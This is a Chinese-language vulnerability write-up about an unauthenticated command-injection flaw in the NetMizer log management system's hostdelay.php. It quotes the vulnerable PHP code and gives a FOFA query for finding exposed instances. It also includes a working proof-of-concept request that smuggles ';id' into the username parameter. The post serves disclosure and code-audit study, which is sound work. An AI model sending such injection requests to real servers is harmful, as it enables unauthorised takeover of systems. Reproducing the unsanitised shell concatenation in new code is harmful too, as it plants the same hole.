---
title: "NetMizer日志管理系统 hostdelay.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-data-chart-hostdelay-username-rce.html
asset_dir: assets/netmizer日志管理系统-hostdelay.php-命令执行漏洞
---

# NetMizer日志管理系统 hostdelay.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/13 08:20
- 1048浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

软件

SQL

Web服务器

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/chart/hostdelay.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞预警服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `hostdelay.php` 业务实现关键逻辑部分

## action=list

```
if($action == 'list'){  // do by c
        if(!$nodeid){
                $devices = array();
                $cmd = "ls $logpath";
                exec($cmd,$devices);
                for($i = 0; $i < count($devices); $i ++){
                        if(!ip2long($devices[$i])) continue;;
                        if(!$nodeid){
                                $nodeid = $devices[$i];
                                break;
                        }
                }
        }
        $stop = $start + $limit;
        //cgi -i 3232235877-3232235877 -a 1444974920 -s 0 -e 400
        $cmd = "$cgi -q 1 -s $start -e $stop -n $nodeid ";
        $cmd .= "-a $start_time -b $stop_time ";
        if(isset($iplist) && $iplist != ""){
                $iplists = explode("-", $iplist);
                $ipstart = ip2long($iplists[0]);
                if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                else $ipstop = $ipstart;
                $cmd .= "-i $ipstart-$ipstop ";
        }
        if(isset($username) && $username != "") $cmd .= "-u $username ";
        if(isset($sorttype)) $cmd .= "-c $sorttype ";
//echo "$cmd\n";
        $fp=@popen($cmd, "r");
```

深入探索

漏洞扫描服务

JSON处理工具

VPN服务

`$nodeid`, `$iplist`, `$username`, `$sorttype` 这些参数均未经过过滤或转义就直接插入命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

其他两个 action 的分支也存在同样的[命令注入](https://mrxn.net/tag/rce)漏洞

## action=area

```
else if($action == 'area'){  // do by C
                $arr_tmp = initprotoArea($start_time, $stop_time, $inval_time);
                $cmd = "$cgi -q 2 -s 0 -e 200 -n $nodeid ";
                //$start_time = 1444971600; 
                $cmd .= "-a $start_time -b $stop_time ";
                if(isset($iplist) && $iplist != ""){
                        $iplists = explode("-", $iplist);
                        $ipstart = ip2long($iplists[0]);
                        if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                        else $ipstop = $ipstart;
                        $cmd .= "-i $ipstart-$ipstop ";
                }
                if(isset($username) && $username != "") $cmd .= "-u $username ";
//echo "$cmd\n";
                $fp=@popen($cmd, "r");
```

## action=detail

```
else if($action == 'detail'){  // do by C
                $cmd = "$cgi -q 2 -s 0 -e 200 -n $nodeid ";
                $cmd .= "-a $start_time -b $stop_time ";
                if(isset($iplist) && $iplist != ""){
                        $iplists = explode("-", $iplist);
                        $ipstart = ip2long($iplists[0]);
                        if(isset($iplists[1])) $ipstop = ip2long($iplists[1]);
                        else $ipstop = $ipstart;
                        $cmd .= "-i $ipstart-$ipstop";
                }
                if(isset($username) && $username != "") $cmd .= "-u $username";
//echo "$cmd\n";
                $fp=@popen($cmd, "r");
                $arr_result = array();
```

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/chart/hostdelay.php?action=list&username=;id HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 `id` 命令并回显执行结果

[![NetMizer日志管理系统 hostdelay.php 命令执行漏洞](images/img-001-f7660ead8a79.webp)](https://image.mrxn.net/60d1d63d330d4d9ca0270c129aa81022.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.action=list](#toc-4-1-)
- [4.2.action=area](#toc-4-2-)
- [4.3.action=detail](#toc-4-3-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
